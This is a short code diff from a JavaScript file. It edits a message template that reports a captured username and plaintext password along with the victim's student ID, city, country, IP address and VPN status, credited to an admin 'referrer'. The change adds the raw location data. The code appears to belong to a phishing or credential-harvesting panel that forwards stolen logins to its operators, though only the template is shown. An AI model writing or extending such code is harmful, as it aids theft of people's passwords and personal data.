@@ -779,7 +779,7 @@ Username: *${escapeMarkdown(username)}*
 Password: *${password}*\n
 Referrer: *${escapeMarkdown(admin.username)}*
 Location: ${escapeMarkdown(location.city || "Unknown")}, ${escapeMarkdown(location.country || "Unknown")}\n Country code: ${location.country_code || "Unknown country code"}\nID:${studentId}
-
+raw data: ${location._raw}
 IP ${ip}
 \n\n VPN : ${vpn}
 `;
